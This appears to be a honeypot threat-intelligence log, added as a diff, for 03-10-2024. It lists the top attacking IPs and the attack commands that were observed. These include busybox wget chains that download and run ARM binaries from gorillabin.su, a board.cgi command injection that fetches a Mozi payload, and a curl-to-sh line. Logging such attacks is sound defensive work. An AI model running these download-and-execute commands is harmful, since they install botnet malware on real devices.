@@ -1,0 +1,20 @@
+Top 5 IPs for 03-10-2024 :
+
+188.166.59.144
+149.50.106.170
+183.224.219.194
+142.93.44.176
+185.224.128.47
+
+
+Malware Observed:
+
+None
+
+Commands/expoits observed :
+
+cd /data/local/tmp/; rm *; busybox wget http://gorillabin.su/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://gorillabin.su/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://gorillabin.su/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://gorillabin.su/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android
+
+GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron
+
+X=$(curl http://154.216.19.57/sh || wget http://154.216.19.57/sh -O-); echo "$X" | sh -s apache.selfrep
